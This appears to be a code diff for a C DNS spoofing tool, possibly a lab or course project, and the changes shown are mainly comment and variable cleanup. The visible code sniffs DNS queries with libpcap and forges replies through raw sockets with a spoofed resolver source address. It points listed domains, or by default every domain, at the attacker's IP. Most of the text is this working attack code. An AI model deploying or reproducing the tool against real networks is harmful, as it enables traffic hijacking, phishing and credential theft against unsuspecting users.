@@ -20,17 +20,17 @@
 #include <net/if.h>
 #include <unistd.h>
 
-#define PROMISC 1			/* Promiscuos mode set for pcap_open_live */
-#define READ_TIME_OUT 0		/* read time out for pcap_open_live */
-#define SIZE_ETHERNET 14	/* ethernet headers are always exactly 14 bytes */
+#define PROMISC 1
+#define READ_TIME_OUT 0
+#define SIZE_ETHERNET 14
 #define IP_SIZE 16
 #define PACKET_SIZE 8192
 
 /* Ethernet header */
 struct ethernet_header {
-	u_char ether_dhost[ETHER_ADDR_LEN]; /* Destination host address */
-	u_char ether_shost[ETHER_ADDR_LEN]; /* Source host address */
-	u_short ether_type; 				/* IP? ARP? RARP? etc */
+	u_char ether_dhost[ETHER_ADDR_LEN];
+	u_char ether_shost[ETHER_ADDR_LEN];
+	u_short ether_type;
 };
 
 /* DNS header */
@@ -51,7 +51,7 @@ struct dns_question {
 };
 
 
-// Link list node for file option
+/* Link list node for file options */
 struct node {
 	char spoof_ip[32];
 	char spoof_domain[150];
@@ -113,7 +113,7 @@ unsigned short find_checksum(unsigned short *buf, int len) {
 }
 
 
-/**
+/*
  * Sends a dns answer using raw sockets
  * http://www.binarytides.com/raw-sockets-c-code-linux/
  */
@@ -123,7 +123,7 @@ void send_dns_reply(char* ip, u_int16_t port, char* packet, int packlen) {
 
 	sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
 	if (sock < 0) {
-		fprintf(stderr, "Error: Could not create socket!\n");
+		fprintf(stderr, "Could not create socket.\n");
 		return;
 	}
 
@@ -132,13 +132,13 @@ void send_dns_reply(char* ip, u_int16_t port, char* packet, int packlen) {
 	to_addr.sin_addr.s_addr = inet_addr(ip);
 
 	if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
-		fprintf(stderr, "Error: Could not set socket port!\n");
+		fprintf(stderr, "Could not set socket port.\n");
 		return;
 	}
 
 	bytes_sent = sendto(sock, packet, packlen, 0, (struct sockaddr *)&to_addr, sizeof(to_addr));
 	if (bytes_sent < 0)
-		fprintf(stderr, "Error: Could not send data!\n");
+		fprintf(stderr, "Could not send data.\n");
 }
 
 
@@ -164,19 +164,17 @@ void dns_spoof(struct node *args, const struct pcap_pkthdr *header, const u_char
 	int spoof_it = 0;
 	struct node *current;
 
-	// get_ip_of_attacker("ens33", spoof_ip);
 	memset(reply_packet, 0, PACKET_SIZE);
 
 	/* define ethernet header */
 	ether = (struct ethernet_header*)(packet);
 	ip = (struct iphdr*)(((char*) ether) + sizeof(struct ethernet_header));
 
-	// get cleaned up IPs
+	/* get cleaned up IPs */
 	src.s_addr = ip->saddr;
 	dest.s_addr = ip->daddr;
 	sprintf(src_ip, "%s", inet_ntoa(src));
 	sprintf(dst_ip, "%s", inet_ntoa(dest));
-
 
 	/* udp header */
 	ip_header_size = ip->ihl * 4;
@@ -186,8 +184,10 @@ void dns_spoof(struct node *args, const struct pcap_pkthdr *header, const u_char
 	dns_hdr = (struct dns_header*)(((char*) udp) + sizeof(struct udphdr));
 	question.qname = ((char*) dns_hdr) + sizeof(struct dns_header);
 
-	// parse domain name
-	// [3]www[7]example[3]com -> www.example.com
+	/*
+	 * parse domain name
+	 * [3]www[7]example[3]com -> www.example.com
+	 */
 	domain_name = question.qname;
 	size = domain_name[0];
 	while (size > 0) {
@@ -200,6 +200,7 @@ void dns_spoof(struct node *args, const struct pcap_pkthdr *header, const u_char
 	}
 	request[--j] = '\0';
 
+	/* get spoof IP */
 	if (!strcmp(args->spoof_domain, "spoof_all")) {
 		spoof_it = 1;
 		memcpy(spoof_ip, args->spoof_ip, 32);
@@ -218,11 +219,11 @@ void dns_spoof(struct node *args, const struct pcap_pkthdr *header, const u_char
 		/* reply is pointed to the beginning of dns header */
 		reply = reply_packet + sizeof(struct ip) + sizeof(struct udphdr);
 
-		// reply dns_hdr
+		/* reply dns_hdr */
 		memcpy(&reply[0], dns_hdr->id, 2);
 		memcpy(&reply[2], "\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00", 10);
 
-		// reply dns_question
+		/* reply dns_question */
 		dns_question_in = (struct dns_question*)(((char*) dns_hdr) + sizeof(struct dns_header));
 		size = strlen(request) + 2;
 		memcpy(&reply[12], dns_question_in, size);
@@ -230,7 +231,7 @@ void dns_spoof(struct node *args, const struct pcap_pkthdr *header, const u_char
 		memcpy(&reply[size], "\x00\x01\x00\x01", 4);
 		size += 4;
 
-		// reply dns_answer
+		/* reply dns_answer */
 		memcpy(&reply[size], "\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x22\x00\x04", 12);
 		size += 12;
 		sscanf(spoof_ip, "%d.%d.%d.%d", (int *)&split_ip[0], (int *)&split_ip[1], (int *)&split_ip[2], (int *)&split_ip[3]);
@@ -239,62 +240,56 @@ void dns_spoof(struct node *args, const struct pcap_pkthdr *header, const u_char
 
 		reply_packet_size = size;
 
-		// IP datatgram
-		// http://www.binarytides.com/raw-sockets-c-code-linux/
+		/* values from http://www.binarytides.com/raw-sockets-c-code-linux/ */
 		reply_ip_hdr = (struct ip *) reply_packet;
 		reply_udp_hdr = (struct udphdr *) (reply_packet + sizeof (struct ip));
-		reply_ip_hdr->ip_hl = 5; //header length
-		reply_ip_hdr->ip_v = 4; //version
-		reply_ip_hdr->ip_tos = 0; //tos
-		reply_ip_hdr->ip_len = sizeof(struct ip) + sizeof(struct udphdr) + reply_packet_size;  //length
-		reply_ip_hdr->ip_id = 0; //id
-		reply_ip_hdr->ip_off = 0; //fragment offset
-		reply_ip_hdr->ip_ttl = 255; //ttl
-		reply_ip_hdr->ip_p = 17; //protocol
-		reply_ip_hdr->ip_sum = 0; //temp checksum
-		reply_ip_hdr->ip_src.s_addr = inet_addr(dst_ip); //src ip - spoofed
-		reply_ip_hdr->ip_dst.s_addr = inet_addr(src_ip); //dst ip
+		reply_ip_hdr->ip_hl = 5;
+		reply_ip_hdr->ip_v = 4;
+		reply_ip_hdr->ip_tos = 0;
+		reply_ip_hdr->ip_len = sizeof(struct ip) + sizeof(struct udphdr) + reply_packet_size;
+		reply_ip_hdr->ip_id = 0;
+		reply_ip_hdr->ip_off = 0;
+		reply_ip_hdr->ip_ttl = 255;
+		reply_ip_hdr->ip_p = 17;
+		reply_ip_hdr->ip_sum = 0;
+		reply_ip_hdr->ip_src.s_addr = inet_addr(dst_ip);
+		reply_ip_hdr->ip_dst.s_addr = inet_addr(src_ip);
 
-		reply_udp_hdr->source = htons(53); //src port - spoofed
+		reply_udp_hdr->source = htons(53);
 		reply_udp_hdr->dest = udp->source;
-		reply_udp_hdr->len = htons(sizeof(struct udphdr) + reply_packet_size); //length
-		reply_udp_hdr->check = 0; //checksum - disabled
+		reply_udp_hdr->len = htons(sizeof(struct udphdr) + reply_packet_size);
+		reply_udp_hdr->check = 0;
 
 		reply_ip_hdr->ip_sum = find_checksum((unsigned short *) reply_packet, reply_ip_hdr->ip_len >> 1);
 
-		/* update the datagram size with ip and udp header */
+		/* update the packet size with ip and udp header */
 		reply_packet_size += (sizeof(struct ip) + sizeof(struct udphdr));
 
-		/* sends our dns spoof msg */
+		/* sends our dns spoof response */
 		send_dns_reply(src_ip, ntohs((*(u_int16_t*)&udp)), reply_packet, reply_packet_size);
-		// // printf("%s\n", datagram);
+
 		printf("Spoofed %s requested from %s\n", request, src_ip);
 	} else {
 		printf("Not Spoofing %s requested from %s as it's not listed in file.\n", request, src_ip);
 	}
 }
 
-
-
-
 int main(int argc, char *argv[])
 {
-	char *dev = NULL;				/* capture device name */
-	char errbuf[PCAP_ERRBUF_SIZE];	/* error buffer */
-	struct bpf_program fp;			/* The compiled filter expression */
-	char *bpf_filter_exp;			/* The filter expression */
-	char *filter_exp;
-	bpf_u_int32 net;				/* The IP of our sniffing device */
-	bpf_u_int32 mask;				/* The netmask of our sniffing device */
+	char *dev = NULL;
+	char errbuf[PCAP_ERRBUF_SIZE];
+	struct bpf_program fp;
+	char *bpf_filter_exp;			/* The input BPF filter expression */
+	char *filter_exp;				/* Final filter expression to be used */
+	bpf_u_int32 net;
+	bpf_u_int32 mask;
 	pcap_t *handle;					/* packet capture handle */
-	int interface_provided = 0;		/* flag to mark interface option */
-	int read_file = 0;				/* flag to mark read option */
-	int filter_string_found = 0;	/* flag to mark interface string filter */
-	char dns_filter[200];
-	int bpf_filter = 0;				/* flag to mark bpf_filter expression */
-	int option = 0;					/* for switching on getopt */
-	unsigned char *filter_str = NULL;		/* filter string */
-	char *file_name;				/* filename for read option */
+	int interface_provided = 0;
+	int read_file = 0;
+	char *dns_filter = "udp and dst port domain";	/* static DNS filter */
+	int bpf_filter = 0;
+	int option = 0;
+	char *file_name;
 	struct node *head, *current, *free_this;
 	char *line = NULL;
 	size_t len = 0;
@@ -359,15 +354,16 @@ int main(int argc, char *argv[])
 		}
 	}
 
+	/* if hostnames file is provided by user, parse that */
 	if (read_file == 1) {
-		FILE *fp = fopen(file_name, "r");
-		if (fp == 0) {
+		FILE *fptr = fopen(file_name, "r");
+		if (fptr == 0) {
 			fprintf(stderr, "failed to open input.txt\n");
 			exit(EXIT_FAILURE);
 		}
 
 		head = current = NULL;
-		while ((read = getline(&line, &len, fp)) != -1) {
+		while ((read = getline(&line, &len, fptr)) != -1) {
 			if (read <= 9) {
 				fprintf(stderr, "Malformed File.\n");
 				goto free_list;
@@ -387,8 +383,8 @@ int main(int argc, char *argv[])
 				current = current->next;
 			}
 		}
-		fclose(fp);
-	} else {
+		fclose(fptr);
+	} else { /* file not provided - spoof all with attackers IP */
 		struct node *new_node = malloc(sizeof(struct node));
 		get_ip_of_attacker(dev, spoof_ip);
 		memcpy(new_node->spoof_ip, spoof_ip, 16);
@@ -420,8 +416,7 @@ int main(int argc, char *argv[])
 		printf("Listening on device: %s\n\n", dev);
 	}
 
-	sprintf(dns_filter, "udp and dst port domain");
-
+	/* Generate final BPF filter string */
 	if (bpf_filter == 1) {
 		filter_exp = malloc(strlen(dns_filter) + strlen(bpf_filter_exp) + 6);
 		strcpy(filter_exp, dns_filter);
